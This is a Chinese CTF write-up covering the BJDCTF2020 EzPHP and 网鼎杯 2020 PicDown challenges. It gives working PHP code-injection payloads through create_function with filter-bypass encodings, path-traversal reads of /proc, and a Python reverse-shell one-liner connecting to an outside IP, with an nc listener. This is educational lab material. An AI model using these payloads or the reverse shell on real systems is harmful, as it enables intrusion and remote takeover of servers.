![](/bmth_blog/images/pasted-156.png)
### 考点6：create_function()代码注入
create_function()函数有两个参数`$args`和`$code`，用于创建一个lambda样式的函数
实际上myFunc() 就相当于:
```php
function myFunc($a, $b){
	return $a+$b;
}
```
这看似正常，实则充满危险。由于`$code`可控，底层又没有响应的保护参数，就导致出现了代码注入。见如下例子：
```php
<?php
$myFunc = create_function('$a, $b', 'return($a+$b);}eval($_POST['Y1ng']);\\');
```
执行时的myFunc()为：
```php
function myFunc($a, $b){
	return $a+$b;
}
eval($_POST['Y1ng']);//}
```
通过手工闭合`}`使后面的代码`eval()`逃逸出了`myFunc()`得以执行，然后利用注释符`//`注释掉`}`保证了语法正确。
回到题目来看，发现正则匹配了很多关键字
```php
$arg = '';
$code = '';
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
}
```
`$arg`和`$code`变量都是可控的，因为`extract()`函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要`extract()`内的数组键名为arg和code，键值为我们构造的用来注入的代码，即可实现`$arg`和`$code`的变量覆盖，导致代码注入。
payload:
`&flag[arg]=}a();//&flag[code]=create_function`
这样就会执行`a();`，发现有一个`include "flag.php"`，包含了这个文件，代表可以使用里面的变量。所以要想办法在不指定变量名称的情况下输出变量的值，使用`get_defined_vars()`用来输出所有变量和值
```
?file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&debu=aqua_is_cute%0a&shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//
```
url编码即为：
```
?file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67[%63%6F%64%65]=create_function&%66%6C%61%67[%61%72%67]=}var_dump(get_defined_vars());//
```
![](/bmth_blog/images/pasted-157.png)

### 考点7：获得flag
>过滤了include关键字
过滤了单引号，双引号
过滤了flag关键字和类似无参数RCE题目中能够得到rea1fl4g.php字符串的各种函数的关键字，比如无法scandir()

应对的策略：
>过滤了include 还能用require
过滤了引号，可以使用那些参数不加引号的函数，`require()`代替`require " "`
过滤了flag，可以base64编码。

**取反绕过+伪协议读源码**
```php
<?php
$str = "php://filter/read=convert.base64-encode/resource=rea1fl4g.php";
$arr1 = explode(' ', $str);
echo "~(";
foreach ($arr1 as $key => $value) {
  echo "%".bin2hex(~$value);
}
echo ")";
?>
```
![](/bmth_blog/images/pasted-158.png)
最后payload：
```
?file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&debu=aqua_is_cute &shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//
```
进行URL编码：
```
?file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67[%63%6F%64%65]=create_function&%66%6C%61%67[%61%72%67]=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));// 
```
![](/bmth_blog/images/pasted-160.png)
最后进行base64解码就出来了
![](/bmth_blog/images/pasted-159.png)

**define+fopen()+fgets()**
没ban掉`fopen()`，可以`fgets()`读取文件，但是这个文件指针需要移动就不能读取完整文件，`$`被禁无法定义变量，用常量
payload：
```
?file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67[%63%6F%64%65]=create_function&%66%6C%61%67[%61%72%67]=}define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r));while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);//
```
![](/bmth_blog/images/pasted-161.png)


参考：
[2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup](https://www.gem-love.com/ctf/770.html)
[[BJDCTF2020]EzPHP](https://shawroot.cc/archives/815)

## [网鼎杯 2020 白虎组]PicDown
发现存在任意文件读取，这里需要bp抓包，否则是下载图片
![](/bmth_blog/images/pasted-166.png)
### 非预期解
直接读取/flag即可获取flag
![](/bmth_blog/images/pasted-167.png)
### 预期解
读取当前进程执行命令
`../../../../../proc/self/cmdline`
[Linux /proc/pid目录下相应文件的信息说明和含义](https://blog.csdn.net/enweitech/article/details/53391567)
![](/bmth_blog/images/pasted-168.png)
即可获取app.py源码
```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```
可以看到`no_one_know_the_manager`中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了
此处可以通过`/proc/self/fd/`读取，这个目录包含了进程打开的每一个文件的链接，这个文件是用open打开的，会创建文件描述符
![](/bmth_blog/images/pasted-169.png)
拿到key的内容，但是shell执行的命令无回显，这里使用反弹shell的方式
```python
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('47.101.145.94',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```
需要url编码后发送
![](/bmth_blog/images/pasted-170.png)
服务器`nc -lvnp 6666`即可获取shell
![](/bmth_blog/images/pasted-171.png)


参考：[[网鼎杯 2020 白虎组]PicDown](https://www.cnblogs.com/mech/p/13746652.html)